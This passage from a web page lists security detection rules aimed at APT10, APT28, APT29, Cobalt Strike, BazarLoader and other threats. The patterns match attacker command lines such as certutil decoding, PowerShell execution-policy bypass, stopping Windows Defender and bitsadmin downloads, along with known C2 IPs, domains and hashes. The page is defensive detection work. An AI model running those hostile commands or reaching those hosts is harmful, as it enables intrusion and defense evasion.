"Mozilla/4.0" or $selection.src.application = "Netscape" or $selection.src.application = "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-EN; rv:1.7.12) Gecko/20100719 Firefox/1.0.7" or $selection.src.application = "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.13) Firefox/3.6.13 GTB7.1" or $selection.src.application = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)" or $selection.src.application = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NETCLR 2.0.50727)" or $selection.src.application = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; SV1)" or $selection.src.application = "Mozilla/4.0 (compatible; MSIE 11.0; Windows NT 6.1; SV1)" or $selection.src.application = "Mozilla/4.0 (compatible; MSIE 8.0; Win32)" or $selection.src.application = "Mozilla v5.1 (Windows NT 6.1; rv:6.0.1) Gecko/20100101 Firefox/6.0.1" or $selection.src.application = "Mozilla/6.1 (compatible; MSIE 9.0; Windows NT 5.3; Trident/5.0)" or $selection.src.application = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; InfoPath.1)" or $selection.src.application = "Mozilla/5.0 (Windows NT 6.1; WOW64) WinHttp/1.6.3.8 (WinHTTP/5.1) like Gecko" or re.regex($selection.src.application, `Mozilla v5\.1 .*`) or $selection.src.application = "MSIE 8.0" or $selection.src.application = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.2)") condition: $selection 
<li><a href="#">rule apt10_behavior { meta: author = "Ariel Millahuel" description = "Detects an ATP10's technique that uses Windows \"certutil.exe\" functionality for payload decoding License: ." reference = "" version = "0.01" created = "2021-03-09" category = "process_creation" product = "windows" mitre = "execution, T1059" events: (($selection1.metadata.product_event_type = "4688" or $selection1.metadata.product_event_type = "1") and (($selection1.target.process.file.full_path = "cmd.exe" and (re.regex($selection1.target.process.command_line, `.*/c certutil -decode C:\\ProgramData\\padre1\.txt C:\\ProgramData.*\\GUP\.txt.*`) or re.regex($selection1.target.process.command_line, `.*/c certutil -decode C:\\ProgramData\\padre2\.txt C:\\ProgramData.*\\libcurl\.txt.*`) or re.regex($selection1.target.process.command_line, `.* /c certutil -decode C:\\ProgramData\\padre3\.txt C:\\ProgramData.*\\3F2E3AB9 .*`))) or ($selection1.target.process.file.full_path = "esentutl.exe" and (re.regex($selection1.target.process.command_line, `.* /y C:\\ProgramData.*\\GUP\.txt /d C:\\ProgramData\\GUP\.exe /o .*`) or re.regex($selection1.target.process.command_line, `.* /y C:\\ProgramData.*\\libcurl\.txt /d C:\\ProgramData\\libcurl\.dll /o .*`))))) condition: $selection1 
<li><a href="#">rule apt28_zekapab_zebrocy_implant__sysmon_firewall_proxy { meta: author = "Roman Ranskyi" description = "Part-1 of APT28 detection pack. (Part-2 ) License: ." reference = "" version = "0.01" created = "2018/11/17" product = "windows" service = "sysmon" mitre = "Execution, t1204, t1085, t1064, Defense Evasion, t1064, t1085, Persistence, t1060, Discovery, t1012, Command And Control, 1043, t1071" events: (((((((((((((((($selectionMD5_dttcodexgigas.metadata.product_event_type = "1" and ($selectionMD5_dttcodexgigas.target.file.md5 = "1fe6af243760ca287f80eafbb98ba1b0" or $selectionMD5_dttcodexgigas.target.file.md5 = "7e67122d3a052e4755b02965e2e56a2e" or $selectionMD5_dttcodexgigas.target.file.md5 = "a13c864980159cd9bdc94074b2389dda" or $selectionMD5_dttcodexgigas.target.file.md5 = "f4cab3a393462a57639faa978a75d10a" or $selectionMD5_dttcodexgigas.target.file.md5 = "e57a401e8f0943b703d975692fcfc0e8")) or ($selectionMD5_dttcodexgigas.metadata.product_event_type = "3" and $selectionMD5_dttcodexgigas.target.ip = "185.217.92.119")) or ($selectionMD5_dttcodexgigas.metadata.product_event_type = "3" and $selectionMD5_dttcodexgigas.target.ip = "109.248.148.42") or $selectionMD5_dttcodexgigas.target.ip = "185.217.92.119" or $selectionMD5_dttcodexgigas.target.ip = "109.248.148.42" or $selectionMD5_dttcodexgigas.target.url = "" or $selectionMD5_dttcodexgigas.target.url = "" or $selectionMD5_dttcodexgigas.target.url = "" or $selectionMD5_dttcodexgigas.target.url = "/agr-enum/progress-inform/cube.php?res=") or ($selectionMD5_dttcodexgigas.metadata.product_event_type = "1" and $selectionMD5_dttcodexgigas.target.file.md5 = "445c84d3f3b26b4c254114db56849157")) or ($selectionMD5_dttcodexgigas.metadata.product_event_type = "13" and $selectionMD5_dttcodexgigas.target.registry.registry_key = "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\AudioMgr")) or ($selectionMD5_dttcodexgigas.metadata.product_event_type = "13" and $selectionMD5_dttcodexgigas.target.registry.registry_key = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\GoogleIndexer")) or ($selectionMD5_dttcodexgigas.metadata.product_event_type = "1" and $selectionMD5_dttcodexgigas.target.file.md5 = "604b3e7d9b11afbdf525336cefc97f88a85dd3a2f0801277d5c7619d6bceb605")) or ($selectionMD5_dttcodexgigas.metadata.product_event_type = "1" and $selectionMD5_dttcodexgigas.target.file.md5 = "87bffb0370c9e14ed5d01d6cc0747cb30a544a71345ea68ef235320378f582ef")) or ($selectionMD5_dttcodexgigas.metadata.product_event_type = "1" and $selectionMD5_dttcodexgigas.target.file.md5 = "a6576282d17cca390e35306a423dcb5ac9276c28eaba63f74001757edc3688df")) or ($selectionMD5_dttcodexgigas.metadata.product_event_type = "1" and $selectionMD5_dttcodexgigas.target.file.md5 = "e7dd9678b0a1c4881e80230ac716b21a41757648d71c538417755521438576f6")) or ($selectionMD5_dttcodexgigas.metadata.product_event_type = "1" and $selectionMD5_dttcodexgigas.target.file.md5 = "05fd4393288a8217243baf9c1bed942b219620b18487bc81fc6ced1238304f93")) or ($selectionMD5_dttcodexgigas.metadata.product_event_type = "1" and $selectionMD5_dttcodexgigas.target.file.md5 = "a15a4e21fe3b06870d52f7383ef45e4ac0dde727b02b3d340f0ba6346b43add1")) or ($selectionMD5_dttcodexgigas.metadata.product_event_type = "1" and $selectionMD5_dttcodexgigas.target.file.md5 = "2b19497db8cb05cd3d22996efe5af8eac0f2ea51e80f606b7b8a79dfaa2f58e2")) or ($selectionMD5_dttcodexgigas.metadata.product_event_type = "1" and $selectionMD5_dttcodexgigas.target.file.md5 = "6d70a54702f4456699d1f1d6c1835619c75f8f340ae95a21743b67123e88677e")) or ($selectionMD5_dttcodexgigas.metadata.product_event_type = "1" and $selectionMD5_dttcodexgigas.target.file.md5 = "5223a45d8b08eb14e87a87edaa4b71593b4f9d2bdb6de1a5b6f3e77869eeca8a")) or ($selectionMD5_dttcodexgigas.metadata.product_event_type = "1" and $selectionMD5_dttcodexgigas.target.file.md5 = "6fdf33cc14672908bd7f25d3620417ee")) condition: $selectionMD5_dttcodexgigas 
<li><a href="#">rule apt28_zekapabzebrocycannon_implant_sysmonfirewallproxy_part2 { meta: author = "Roman Ranskyi" description = "Part-2 of APT28 detection pack. (Part-1 ) License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "Execution, t1204, t1085, t1064, Defense Evasion, t1064, t1085, Persistence, t1060, Discovery, t1012, Command And Control, t1043, t1071, tool.zekapab, tool.zebrocy, tool.cannon" events: ((((((((((((($selectionSysmon3_emanueledelucia.target.url = "" or $selectionSysmon3_emanueledelucia.target.url = "beatguitar.com" or $selectionSysmon3_emanueledelucia.target.ip = "185.99.133.72") or ($selectionSysmon3_emanueledelucia.metadata.product_event_type = "1" and $selectionSysmon3_emanueledelucia.target.file.md5 = "549726b8bfb1919a343ac764d48fdc81")) or ($selectionSysmon3_emanueledelucia.metadata.product_event_type = "1" and $selectionSysmon3_emanueledelucia.target.file.md5 = "43d7ffd611932cf51d7150b176ecfc29")) or ($selectionSysmon3_emanueledelucia.metadata.product_event_type = "3" and $selectionSysmon3_emanueledelucia.target.ip = "185.99.133.72")) or ($selectionSysmon3_emanueledelucia.metadata.product_event_type = "13" and $selectionSysmon3_emanueledelucia.target.registry.registry_key = "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\UIMgr")) or ($selectionSysmon3_emanueledelucia.metadata.product_event_type = "1" and $selectionSysmon3_emanueledelucia.target.file.md5 = "02c46f30f4c68a442cf7e13bebe8d3f8")) or ($selectionSysmon3_emanueledelucia.metadata.product_event_type = "1" and $selectionSysmon3_emanueledelucia.target.file.md5 = "1aedaa67e7613594c135177f2973e2c7")) or ($selectionSysmon3_emanueledelucia.metadata.product_event_type = "1" and $selectionSysmon3_emanueledelucia.target.file.md5 = "602d2901d55c2720f955503456ac2f68")) or ($selectionSysmon3_emanueledelucia.metadata.product_event_type = "1" and $selectionSysmon3_emanueledelucia.target.file.md5 = "602d2901d55c2720f955503456ac2f68")) or ($selectionSysmon3_emanueledelucia.metadata.product_event_type = "1" and ($selectionSysmon3_emanueledelucia.target.file.md5 = "3eaf97b9c6b44f0447f2bd1c7acb8c96" or $selectionSysmon3_emanueledelucia.target.file.md5 = "6bc5f53d4082f12dd83aca45bae81e64" or $selectionSysmon3_emanueledelucia.target.file.md5 = "333d2b9e99b36fb42f9e79a2833fad9c")) or $selectionSysmon3_emanueledelucia.target.ip = "89.37.226.123" or $selectionSysmon3_emanueledelucia.target.url = "/advance/portable_version/service.php") or ($selectionSysmon3_emanueledelucia.metadata.product_event_type = "1" and ($selectionSysmon3_emanueledelucia.target.file.md5 = "84352ccad3cfa152d98cf76b08623b92" or $selectionSysmon3_emanueledelucia.target.file.md5 = "fe0da70a592d25ddbfbd47b22f88542f" or $selectionSysmon3_emanueledelucia.target.file.md5 = "4384c701308a9d3aa92f49615ec74b2d" or $selectionSysmon3_emanueledelucia.target.file.md5 = "26b213343bac2b4c69a261a2f5c00e89" or $selectionSysmon3_emanueledelucia.target.file.md5 = "47a026d93ae8e0cc292e8d7a71ddc89e"))) or ($selectionSysmon3_emanueledelucia.metadata.product_event_type = "11" and ($selectionSysmon3_emanueledelucia.target.file.full_path = "C:\\Users\\Public\\dset.ini" or $selectionSysmon3_emanueledelucia.target.file.full_path = "C:\\Users\\Public\\boot.ini" or $selectionSysmon3_emanueledelucia.target.file.full_path = "C:\\Users\\Public\\kla.bin" or $selectionSysmon3_emanueledelucia.target.file.full_path = "C:\\Users\\Public\\officeexcp.bin" or $selectionSysmon3_emanueledelucia.target.file.full_path = "C:\\Users\\Public\\dset.ini"))) or ($selectionSysmon3_emanueledelucia.metadata.product_event_type = "1" and ($selectionSysmon3_emanueledelucia.target.file.md5 = "ea553c3de3fffbfa047e8e0eb2557b8b" or $selectionSysmon3_emanueledelucia.target.file.md5 = "8da56a4b1a5ff8e4643421a5fefb5dc4" or $selectionSysmon3_emanueledelucia.target.file.md5 = "a225d457c3396e647ffc710cd1edd4c74dc57152"))) condition: $selectionSysmon3_emanueledelucia 
<li><a href="#">rule apt29 { meta: author = "Florian Roth" description = "This method detects a suspicious powershell command line combination as used by APT29 in a campaign against US think tanks License: ." reference = "" version = "0.01" created = "2018/12/04" category = "process_creation" product = "windows" mitre = "execution, g0016, t1086" events: (re.regex($selection.target.process.command_line, `.*-noni -ep bypass $.*`) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) condition: $selection 
<li><a href="#">rule apt29 { meta: author = "Florian Roth" description = "This method detects a suspicious powershell command line combination as used by APT29 in a campaign against US think tanks License: ." reference = "" version = "0.01" created = "2018/12/04" category = "process_creation" product = "windows" mitre = "execution, g0016, t1086" events: (re.regex($selection.target.process.command_line, `.*-noni -ep bypass $.*`) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) condition: $selection 
<li><a href="#">rule apt33_remcos_sysmon_behavior_historic_indicators { meta: author = "Lee Archinal" description = "This content detects characteristics of APT33 executable Remcos as seen in a malware lab. License: ." reference = "" version = "0.01" created = "2019/01/11" product = "windows" service = "sysmon" mitre = "execution, t1059, persistence, t1060" events: ((($selection1.metadata.product_event_type = "1" and $selection1.target.process.command_line = "C:\\Windows\\SysWOW64\\WerFault.exe -u -p 6184 -s 1124") or ($selection1.metadata.product_event_type = "11" and (re.regex($selection1.target.file.full_path, `.*\\AppData\\Roaming\\Microsyncs\\MyHTC\.exe`) or re.regex($selection1.target.file.full_path, `.*\\AppData\\Local\\Temp\\install\.vbs`)))) or ($selection1.metadata.product_event_type = "13" and (re.regex($selection1.target.registry.registry_key, `.*\\Software\\Microsoft\\Windows\\CurrentVersion\\ApplicationAssociationToasts\\VBSFile_\.vbs`) or re.regex($selection1.target.registry.registry_key, `.*\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\\.vbs\\OpenWithProgids\\VBSFile`) or re.regex($selection1.target.registry.registry_key, `.*\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache\\C:\\Windows\\System32\\WScript\.exe\.ApplicationCompany`) or re.regex($selection1.target.registry.registry_key, `.*\\Software\\Microsoft\\Windows\\Shell\\MuiCache\\C:\\Windows\\System32\\WScript\.exe\.FriendlyAppName`) or re.regex($selection1.target.registry.registry_key, `.*\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\AutoDetect`) or re.regex($selection1.target.registry.registry_key, `.*\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\UNCAsIntranet`) or re.regex($selection1.target.registry.registry_key, `.*\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\IntranetName`) or re.regex($selection1.target.registry.registry_key, `.*\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProxyBypass`)))) condition: $selection1 
<li><a href="#">rule apt40_dropbox_tool_user_agent { meta: author = "Thomas Patzke" description = "Detects suspicious user agent string of APT40 Dropbox tool License: ." reference = "" version = "0.01" created = "2021-03-09" category = "proxy" events: ($selection.src.application = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36" and $selection.target.hostname = "api.dropbox.com") condition: $selection 
<li><a href="#">rule atlassian_confluence_download_attachments_remote_code_executiondirectory_traversal { meta: author = "Halil Ibrahim Cosgun" description = "Detects Atlassian Confluence RCE via Attachment Download. Sample regex added to detect directory traversal, it can be improved. License: ." reference = "" version = "0.01" created = "2021-03-09" product = "proxy" mitre = "initial_access, persistence, privilege_escalation, T1190, T1100" events: ($selection.network.http.method = "POST" and re.regex($selection.target.url, `/plugins/drag-and-drop/upload\.action\?pageId.*&filename=^\(\?!\..*\\/\.\\/\.\)\.{0,200}$.*&size=.*&mimeType=.*atl_token=.*&name=^\(\?!\..*\\/\.\\/\.\)\.{0,200}$.*`)) condition: $selection 
<li><a href="#">rule attempt_to_disable_windows_events_logging_via_registry { meta: author = "Joseph Kamau" description = "This rule detects a registry modification which allows the disabling of logging of events in the Windows operating system after a reboot. License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "defense_evasion, t1112" events: (($selection1.metadata.product_event_type = "13" and re.regex($selection1.target.registry.registry_key, `.*\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\AUTOLOGGER_NAME.*`) and $selection1.metadata.event_type = "SetValue") or ($selection1.metadata.product_event_type = "1" and re.regex($selection1.target.process.command_line, `.*\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\AUTOLOGGER_NAME.*`))) condition: $selection1 
<li><a href="#">rule attempts_to_stop_windows_defender_and_windows_updates { meta: author = "Joseph Kamau" description = "This rule detects attempts to stop the windows defender and windows update components License: ." reference = "" version = "0.01" created = "2021-03-09" product = "Windows" category = "process_creation" mitre = "defense_evasion, t1089" events: ((re.regex($selection.target.process.command_line, `.* stop wuauserv`) or re.regex($selection.target.process.command_line, `.* stop WinDefend`) or re.regex($selection.target.process.command_line, `.* stop wscsvc`) or re.regex($selection.target.process.command_line, `.* stop mpssvc`) or re.regex($selection.target.process.command_line, `.* delete WinDefend`) or re.regex($selection.target.process.command_line, `.*SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\Disable.*`)) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) condition: $selection 
<li><a href="#">rule avg_antivirus__avast_antivirus_dll_search_order_hijacking_and_potential_abuses { meta: author = "Osman Demir" description = "Detects CVE-2019-17093 exploitation attempt License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "persistence, privilege_escalation, defense_evasion, T1038" events: (($selection1.metadata.product_event_type = "7" and re.regex($selection1.target.process.file.full_path, `.*/AVGSvc\.exe`) and $selection1.target.process.file.full_path = "C:\\Windows\\System32\\wbem\\wbemcomn.dll") or ($selection1.metadata.product_event_type = "11" and ($selection1.target.file.full_path = "C:\\Program Files\\System32\\wbemcomn.dll" or $selection1.target.file.full_path = "C:\\Windows\\System32\\wbem\\wbemcomn.dll"))) condition: $selection1 
<li><a href="#">rule backdoor_detection_on_sql_servers { meta: author = "Furkan Celik" description = "An attack targeting the aviation industry has been identified. You can detect the url and ip list of this attack by installing backdoor on SQL servers on your system. License: ." reference = "" version = "0.01" created = "2020/04/01" product = "proxy" mitre = "T1086, T1083, T1132, T1088" events: (($selection.target.url = "a.vollar.ga" or $selection.target.url = "aa.vollar.ga" or $selection.target.url = "b.vollar.ga" or $selection.target.url = "c.vollar.ga" or $selection.target.url = "ca.vollar.gad.vollar.ga" or $selection.target.url = "da.vollar.ga" or $selection.target.url = "f.vollar.ga" or $selection.target.url = "h.vollar.ga" or $selection.target.url = "ja.vollar.ga" or $selection.target.url = "k.vollar.ga" or $selection.target.url = "m.vollar.ga" or $selection.target.url = "ma.vollar.ga" or $selection.target.url = "n.vollar.ga" or $selection.target.url = "na.vollar.ga" or $selection.target.url = "o.vollar.ga" or $selection.target.url = "oa.vollar.ga" or $selection.target.url = "ob.vollar.ga" or $selection.target.url = "s.vollar.ga" or $selection.target.url = "sa.vollar.ga" or $selection.target.url = "t.vollar.ga" or $selection.target.url = "ta.vollar.ga" or $selection.target.url = "v.vollar.ga" or $selection.target.url = "x.vollar.ga" or $selection.target.url = "xa.vollar.ga" or $selection.target.url = "z.vollar.ga") and ($selection.principal.ip = "183.131.3.196" or $selection.principal.ip = "192.37.90.118" or $selection.principal.ip = "39.109.116.162" or $selection.principal.ip = "154.221.26.108" or $selection.principal.ip = "103.53.211.94" or $selection.principal.ip = "185.172.66.203" or $selection.principal.ip = "51.105.249.223" or $selection.principal.ip = "154.211.14.66" or $selection.principal.ip = "154.221.19.221" or $selection.principal.ip = "145.239.23.7" or $selection.principal.ip = "180.97.220.5" or $selection.principal.ip = "207.180.202.208")) condition: $selection 
<li><a href="#">rule backup_catalog_deleted { meta: author = "Florian Roth (rule), Tom U. @c_APT_ure (collection)" description = "Detects backup catalog deletions License: . @c_APT_ure (collection)." reference = "" version = "0.01" created = "2017/05/12" product = "windows" service = "application" mitre = "defense_evasion, t1107, t1070.004" events: ($selection.metadata.product_event_type = "524" and $selection.src.application = "Microsoft-Windows-Backup") condition: $selection 
<li><a href="#">rule bazar_loader_detection_sysmon_detection { meta: author = "Ariel Millahuel" description = "BazarLoader (also known as Bazar Loader, Bazar Backdoor or Team9 Backdoor) is a module of the dreaded TrickBot Trojan. It is mostly used to gain a foothold in compromised enterprise networks License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "execution, T1059" events: ($selection1.metadata.product_event_type = "11" and (re.regex($selection1.target.file.full_path, `.*DD45\.exe.*`) or re.regex($selection1.target.file.full_path, `.*BthCxn\.exe.*`) or re.regex($selection1.target.file.full_path, `.*v86\.exe_.*`))) condition: $selection1 
<li><a href="#">rule bcdedit_off_sysmon { meta: author = "Michael Haag, Alexandr Yampolskyi" description = "Detects usage of bcdedit off. License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "Execution, t1204, t1059" events: ($selection.metadata.product_event_type = "1" and $selection.target.process.file.full_path = "bcdedit.exe" and re.regex($selection.target.process.command_line, `.*off`)) condition: $selection 
<li><a href="#">rule betabot_neurevt_sysmon { meta: author = "Alexandr Yampolskyi, SOC Prime" description = "BetaBot is a stealer software. License: ." reference = "" version = "0.01" created = "2019/01/13" product = "windows" service = "sysmon" mitre = "Execution, t1204" events: ($selection.metadata.product_event_type = "1" and ($selection.target.file.md5 = "b4576437f4b06d438a03a9f8f0776cde" or $selection.target.file.md5 = "a0763d3332bb87595ed6303ab3cdb8fff7dd1e976ee161003a62316fea332941")) condition: $selection 
<li><a href="#">rule bits_http_client_useragent_usage { meta: author = "Joseph Kamau" description = "This rule can be used to hunt for anomalous trafic initiated to external hosts in proxy logs License: ." reference = "" version = "0.01" created = "2021-03-09" product = "proxy" mitre = "defense_evasion, t1197" events: re.regex($selection.src.application, `Microsoft BITS.*`) condition: $selection 
<li><a href="#">rule bitsadmin_download { meta: author = "Michael Haag" description = "Detects usage of bitsadmin downloading a file License: ." reference = "" version = "0.01" created = "2021-03-09" category = "process_creation" product = "windows" mitre = "defense_evasion, persistence, t1197, s0190" events: (re.regex($selection.target.process.file.full_path, `.*\\bitsadmin\.exe`) and $selection.target.process.command_line = "/transfer" and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) condition: $selection 
<li><a href="#">rule bitsadmin_download_sysmon { meta: author = "Michael Haag" description = "Detects usage of bitsadmin downloading a file. License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "Execution, t1204, t1059" events: ($selection.metadata.product_event_type = "1" and re.regex($selection.target.process.file.full_path, `.*\\bitsadmin\.exe`) and (re.regex($selection.target.process.command_line, `.*/transfer`) or re.regex($selection.target.process.command_line, `.*/download`))) condition: $selection 
<li><a href="#">rule burp_suite_scanner_and_burp_collaborator_detected_via_proxy { meta: author = "Emir Erdogan" description = "Burp Suite Scanner Activirt Detected via Proxy License: ." reference = "" version = "0.01" created = "2021-03-09" category = "proxy" mitre = "T1190, T1210" events: re.regex($selection.target.url, `.*burpcollaborator.*`) condition: $selection 
<li><a href="#">rule cactustorch_remote_thread_creation { meta: author = "@SBousseaden (detection), Thomas Patzke (rule)" description = "Detects remote thread creation from CACTUSTORCH as described in references. License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "execution, t1055, t1064" events: ($selection.metadata.product_event_type = "8" and (re.regex($selection.src.process.file.full_path, `.*\\System32\\cscript\.exe`) or re.regex($selection.src.process.file.full_path, `.*\\System32\\wscript\.exe`) or re.regex($selection.src.process.file.full_path, `.*\\System32\\mshta\.exe`) or re.regex($selection.src.process.file.full_path, `.*\\winword\.exe`) or re.regex($selection.src.process.file.full_path, `.*\\excel\.exe`)) and re.regex($selection.target.process.file.full_path, `.*\\SysWOW64\\.*`) and $selection.src.application = "") condition: $selection 
<li><a href="#">rule certutil_activity_via_proxy { meta: author = "Joseph Kamau" description = "This rule can be used to hunt for Living of the Land activity from certutil from proxy server logs. License: ." reference = "" version = "0.01" created = "2021-03-09" product = "proxy" mitre = "command&control, T1105, defense-evasion, T1140" events: ($selection.src.application = "CertUtil URL Agent" or re.regex($selection.src.application, `Microsoft-CryptoAPI/.*`)) condition: $selection 
<li><a href="#">rule certutil_encode { meta: author = "Florian Roth" description = "Detects suspicious a certutil command that used to encode files, which is sometimes used for data exfiltration License: ." reference = "" version = "0.01" created = "2019/02/24" category = "process_creation" product = "windows" events: ((re.regex($selection.target.process.command_line, `certutil -f -encode .*`) or re.regex($selection.target.process.command_line, `certutil\.exe -f -encode .*`) or re.regex($selection.target.process.command_line, `certutil -encode -f .*`) or re.regex($selection.target.process.command_line, `certutil\.exe -encode -f .*`)) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) condition: $selection 
<li><a href="#">rule chafer_malware_url_pattern { meta: author = "Florian Roth" description = "Detects HTTP requests used by Chafer malware License: ." reference = "" version = "0.01" created = "2019/01/31" category = "proxy" events: re.regex($selection.target.url, `.*/asp\.asp\?ui=.*`) condition: $selection 
<li><a href="#">rule citrix_netscaler_attack_cve201919781 { meta: author = "Arnim Rupp, Florian Roth" description = "Detects CVE-2019-19781 exploitation attempt against Citrix Netscaler, Application Delivery Controller and Citrix Gateway Attack License: ." reference = "" version = "0.01" created = "2020/01/02" category = "webserver" mitre = "initial_access, t1190" events: (re.regex($selection.target.url, `.*/\.\./vpns/.*`) or re.regex($selection.target.url, `.*/vpns/cfg/smb\.conf`) or re.regex($selection.target.url, `.*/vpns/portal/scripts/.*\.pl.*`)) condition: $selection 
<li><a href="#">rule cmdexe_launching_a_browser { meta: author = "Joseph Kamau" description = "This rule detects when cmd.exe starts a browser, which is an anomaly as opposed to a user accessing a site directly through a browser License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "process_creation" mitre = "execution, t1059" events: re.regex($selection.target.process.command_line, `cmd\.exe /c \"start http.*`) condition: $selection 
<li><a href="#">rule cmdkey_cached_credentials_recon { meta: author = "jmallette" description = "Detects usage of cmdkey to look for cached credentials License: ." reference = "" version = "0.01" created = "2021-03-09" category = "process_creation" product = "windows" mitre = "credential_access, t1003" events: (re.regex($selection.target.process.file.full_path, `.*\\cmdkey\.exe`) and re.regex($selection.target.process.command_line, `.* /list .*`) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) condition: $selection 
<li><a href="#">rule cmstp_uac_bypass_via_com_object_access { meta: author = "Nik Seetharaman" description = "Detects UAC Bypass Attempt Using Microsoft Connection Manager Profile Installer Autoelevate-capable COM Objects License: ." reference = "" version = "0.01" created = "2021-03-09" category = "process_creation" product = "windows" mitre = "defense_evasion, privilege_escalation, execution, t1088, t1191, g0069, car.2019-04-001" events: (re.regex($selection1.src.process.command_line, `.*\\DllHost\.exe`) and ($selection1.metadata.product_event_type = "4688" or $selection1.metadata.product_event_type = "1") and (re.regex($selection1.src.process.command_line, `.*{3E5FC7F9-9A51-4367-9063-A120244FBEC7}`) or re.regex($selection1.src.process.command_line, `.*{3E000D72-A845-4CD9-BD83-80C07C3B881F}`))) condition: $selection1 
<li><a href="#">rule cmstpexe_execution_detector_sysmon_behavior { meta: author = "Lee Archinal" description = "This content detects usage of the Microsoft Connection Manager Profile as detected by Sysmon. License: ." reference = "" version = "0.01" created = "2019/09/16" product = "windows" service = "sysmon" mitre = "execution, t1191" events: (($selection1.target.process.file.full_path = "C:\\Windows\\System32\\cmstp.exe" and (($selection1.metadata.product_event_type = "1" and re.regex($selection1.target.process.command_line, `cmstp\.exe /s .*\.inf`)) or ($selection1.metadata.product_event_type = "13" and re.regex($selection1.target.registry.registry_key, `.*\\cmstp\.exe`)))) or ($selection1.metadata.product_event_type = "11" and $selection1.target.process.file.full_path = "C:\\WINDOWS\\ssytem32\\cmstp.exe")) condition: $selection1 
<li><a href="#">rule cobalt_strike_dns_beaconing { meta: author = "Florian Roth" description = "Detects suspicious DNS queries known from Cobalt Strike beacons License: ." reference = "" version = "0.01" created = "2018/05/10" category = "dns" events: (re.regex($selection.target.url, `aaa\.stage\..*`) or re.regex($selection.target.url, `post\.1.*`)) condition: $selection 
<li><a href="#">rule cobaltstrike_malleable_ocsp_profile { meta: author = "Markus Neis" description = "Detects Malleable (OCSP) Profile with Typo (OSCP) in URL License: ." reference = "" version = "0.01" created = "2021-03-09" category = "proxy" mitre = "t1102" events: (re.regex($selection.target.url, `.*/oscp/.*`) and $selection.principal.hostname = "ocsp.verisign.com") condition: $selection 
<li><a href="#">rule cobaltstrike_malleable_onedrive_browsing_traffic_profile { meta: author = "Markus Neis" description = "Detects Malleable OneDrive Profile License: ." reference = "" version = "0.01" created = "2021-03-09" category = "proxy" mitre = "t1102" events: (($selection.network.http.method = "GET" and re.regex($selection.target.url, `.*\?manifest=wac`) and $selection.principal.hostname = "onedrive.live.com") and not (re.regex($selection.target.url, `http.*://onedrive\.live\.com/.*`))) condition: $selection 
<li><a href="#">rule cobaltstrike_process_injection { meta: author = "Olaf Hartong, Florian Roth" description = "Detects a possible remote threat creation with certain characteristics which are typical for Cobalt Strike beacons License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "process_injection, t1055" events: ($selection.metadata.product_event_type = "8" and re.regex($selection.target.process.file.file_metadata.pe.import_hash, `.*0B80`)) condition: $selection 
<li><a href="#">rule code42_server_dll_search_order_hijack { meta: author = "Halil Ibrahim Cosgun" description = "Detects CVE-2019-16861 exploitation attempt License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "persistence, privilege_escalation, defense_evasion, T1038" events: (($selection1.metadata.product_event_type = "11" and $selection1.target.file.full_path = "C:\\python27\\msvcr120.dll") or ($selection1.metadata.product_event_type = "7" and re.regex($selection1.target.process.file.full_path, `.*\\CrashPlanPROServer\.exe`) and $selection1.target.process.file.full_path = "C:\\python27\\msvcr120.dll")) condition: $selection1 
